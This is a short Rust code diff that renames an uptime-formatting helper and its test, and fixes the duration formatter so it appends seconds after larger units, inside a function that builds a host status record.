@@ -83,7 +83,7 @@ pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
         cpu,
         ram,
         antivirus,
-        uptime_human(ps(text::UPTIME)),
+        uptime(ps(text::UPTIME)),
         afk,
         ping_ms.map_or_else(|| "Unknown".into(), |v| format!("{v} ms")),
         hwid,
@@ -157,7 +157,7 @@ fn afk() -> String {
     "0s".into()
 }
 
-fn uptime_human(v: String) -> String {
+fn uptime(v: String) -> String {
     v.trim()
         .parse::<u64>()
         .map(human)
@@ -175,7 +175,8 @@ fn human(mut secs: u64) -> String {
     if d > 0 { out.push_str(&format!("{d}d")); }
     if h > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{h}h")); }
     if m > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{m}m")); }
-    if out.is_empty() { out.push_str(&format!("{s}s")); }
+    if s > 0 { if !out.is_empty() { out.push(' '); } out.push_str(&format!("{s}s")); }
+    if out.is_empty() { out.push_str("0s"); }
     out
 }
 
@@ -230,7 +231,7 @@ mod tests {
     }
 
     #[test]
-    fn uptime_human_contract() {
+    fn uptime_contract() {
         assert_eq!(super::human(30), "30s");
         assert_eq!(super::human(121), "2m 1s");
         assert_eq!(super::human(7320), "2h 2m");
